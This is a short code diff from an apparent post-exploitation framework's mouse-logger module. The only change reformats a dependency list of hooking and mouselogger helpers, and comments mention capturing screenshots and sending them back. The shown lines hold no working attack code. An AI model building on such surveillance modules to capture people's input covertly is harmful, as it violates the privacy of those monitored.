@@ -12,7 +12,7 @@ class MouseLoggerModule(PupyModule):
     # WARNING : screenshots are kept in memory before beeing dumped
     #TODO change that and add a callback to automatically send back screenshots without need for dumping
     unique_instance = True
-    dependencies = [ 'pupwinutils.mouselogger', 'png', 'pupwinutils.hookfuncs' ]
+    dependencies = ['pupwinutils.mouselogger', 'png', 'pupwinutils.hookfuncs']
 
     @classmethod
     def init_argparse(cls):
